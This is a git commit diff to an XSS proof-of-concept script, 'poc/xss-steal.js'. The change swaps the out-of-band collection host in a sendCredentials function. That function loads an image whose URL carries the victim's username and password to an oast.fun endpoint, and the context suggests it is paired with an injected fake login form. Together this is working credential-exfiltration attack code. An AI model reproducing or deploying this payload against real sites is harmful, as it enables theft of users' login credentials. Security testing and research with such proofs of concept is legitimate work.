66215c588bb43b45f0e07cdd4a684cadd74116e0
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2024-08-25 16:16:59 +0900

    Update xss-steal.js

--- poc/xss-steal.js
+++ poc/xss-steal.js
@@ -60,7 +60,7 @@ document.body.appendChild(form);
 
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `https://njttuwoazmjklrngrkua34y4f15hdrltu.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+  img.src = `https://fakonltzsfedwiqhgufs8ppqlvhjalooa.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   document.body.appendChild(img);
 }
 
